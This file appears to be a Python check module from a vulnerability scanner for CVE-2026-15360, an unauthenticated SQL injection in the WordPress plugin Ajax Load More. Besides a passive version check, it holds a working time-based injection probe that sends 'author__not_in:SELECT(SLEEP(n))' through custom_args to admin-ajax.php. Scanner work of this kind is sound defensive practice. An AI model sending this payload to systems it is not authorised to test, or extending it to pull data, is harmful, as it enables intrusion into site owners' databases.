from __future__ import annotations

import json
import time
import urllib.parse
from typing import Any, cast

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2026-15360"
NAME = "Ajax Load More unauthenticated SQL injection via custom_args"
COMPONENT = "WordPress plugin Ajax Load More"
AFFECTED_RULE = "Ajax Load More before 8.0.1 (WordPress 7.0+ scalar author__not_in path)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
PLUGIN_SLUG = "ajax-load-more"
AJAX_PATH = "/wp-admin/admin-ajax.php"


def _classify(version: str | None) -> str:
    if not version:
        return "DETECTED_VERSION_UNKNOWN"
    try:
        parts = tuple(int(part) for part in version.split(".")[:3])
    except ValueError:
        return "DETECTED_VERSION_UNKNOWN"
    if len(parts) < 3:
        parts = parts + (0,) * (3 - len(parts))
    return "LIKELY_VULNERABLE" if parts < (8, 0, 1) else "PATCHED"


def _core_supports_scalar_author_not_in(version: str | None) -> bool:
    """WordPress 7.0 stopped casting scalar author__not_in values to int."""
    if not version:
        return True
    try:
        parts = tuple(int(part) for part in version.split(".")[:2])
    except ValueError:
        return True
    if len(parts) < 2:
        parts = parts + (0,) * (2 - len(parts))
    return parts >= (7, 0)


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=_classify,
        remediation="Upgrade Ajax Load More to 8.0.1 or newer.",
        exploit_available=True,
    )


def _endpoint(base: str) -> str:
    return f"{base}{AJAX_PATH}"


def _request(
    client: HttpClient,
    endpoint: str,
    custom_args: str,
    timeout: int,
) -> tuple[float, dict[str, Any]]:
    params = {
        "action": "alm_get_posts",
        "post_type": "post",
        "posts_per_page": "1",
        "custom_args": custom_args,
    }
    url = f"{endpoint}?{urllib.parse.urlencode(params)}"
    start = time.perf_counter()
    response = client.get(url, timeout=timeout)
    return time.perf_counter() - start, response


def _response_meta(response: dict[str, Any]) -> dict[str, Any]:
    try:
        payload = json.loads(str(response.get("body") or "{}"))
    except json.JSONDecodeError:
        return {}
    if isinstance(payload, dict) and isinstance(payload.get("meta"), dict):
        return cast(dict[str, Any], payload["meta"])
    return {}


def run_timing_probe(
    target_url: str,
    delay: int = 1,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Send the public ALM AJAX request with a scalar author__not_in SLEEP."""
    base = normalize_url(target_url).rstrip("/")
    endpoint = _endpoint(base)
    client = HttpClient(timeout=timeout, proxy=proxy)
    request_timeout = max(timeout, delay * 4 + 5)

    baseline, baseline_response = _request(
        client, endpoint, "author__not_in:0", request_timeout
    )
    if is_transport_error(baseline_response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=endpoint,
            detail=f"The baseline AJAX request failed in transit ({transport_error_detail(baseline_response)}).",
            action="Retry when the target is reachable.",
        )

    meta = _response_meta(baseline_response)
    if meta and not int(meta.get("totalposts") or meta.get("postcount") or 0):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=endpoint,
            evidence={"baseline_seconds": round(baseline, 3), "meta": meta},
            detail=(
                "The public Ajax Load More endpoint returned zero published posts; "
                "the injected sub-select is not evaluated without a result row."
            ),
            action="Publish at least one post and retry.",
        )

    payload_value = f"SELECT(SLEEP({delay}))"
    elapsed, payload_response = _request(
        client, endpoint, f"author__not_in:{payload_value}", request_timeout
    )
    if is_transport_error(payload_response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=endpoint,
            detail=f"The timing AJAX request failed in transit ({transport_error_detail(payload_response)}).",
            action="Retry when the target is reachable.",
        )

    evidence = {
        "endpoint": endpoint,
        "delay_seconds": delay,
        "baseline_seconds": round(baseline, 3),
        "payload_seconds": round(elapsed, 3),
        "payload": f"author__not_in:{payload_value}",
        "meta": meta,
    }
    if elapsed >= delay * 0.8 and (elapsed - baseline) >= delay * 0.6:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=endpoint,
            evidence=evidence,
            detail=(
                f"The public custom_args value became a scalar author__not_in and "
                f"SLEEP({delay}) delayed the AJAX response by {elapsed - baseline:.2f}s "
                "over the baseline. The probe is time-based and does not extract data."
            ),
            action="Upgrade Ajax Load More to 8.0.1 or newer.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="HIGH",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=endpoint,
        evidence=evidence,
        detail=(
            "The AJAX endpoint responded but the scalar author__not_in value did not "
            "produce the expected delay; the build may be patched, the core may cast "
            "the value to an integer, or the request may be filtered."
        ),
        action="Confirm the installed Ajax Load More and WordPress versions.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    result = run_timing_probe(target_url, delay=1, timeout=timeout, proxy=proxy)
    result.detail += " Safe mode uses a 1-second timing check; aggressive mode uses 3 seconds."
    return result


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    return run_timing_probe(target_url, delay=3, timeout=timeout, proxy=proxy)


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del aggressive_command, aggressive_args, kwargs
    if not run_exploit_check:
        return passive_result(plugins)
    if exploit_mode == "aggressive":
        result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    else:
        result = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    if result.status == "NOT_CONFIRMED" and not _core_supports_scalar_author_not_in(cms_version):
        result.status = "BLOCKED_EXTERNAL"
        result.confidence = "MEDIUM"
        result.detail = (
            f"WordPress {cms_version} casts the scalar author__not_in value to an "
            "integer, so the raw SQL path is not reachable on this core. The "
            "passive plugin version result is the authoritative assessment."
        )
        result.action = "Use the passive plugin version result or retest on WordPress 7.0+."
    return result


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> dict[str, Any]:
    del target_url, timeout, proxy, aggressive_args, aggressive_command
    return {
        "removed": [],
        "remaining": [],
        "manual": [],
        "detail": "The timing probe only sends GET requests; no cleanup is required.",
    }


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["0-8.0.0"],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "SQL Injection",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-22",
        "updated": "2026-11-22",
        "required_detectors": [PLUGIN_SLUG],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-15360",
            "https://wpscan.com/vulnerability/0b5c1dd6-8bb9-45f7-8237-84a43ef53ec4/",
            "https://wordpress.org/plugins/ajax-load-more/",
            "https://github.com/ajaxloadmore/ajax-load-more/pull/263",
        ],
    }
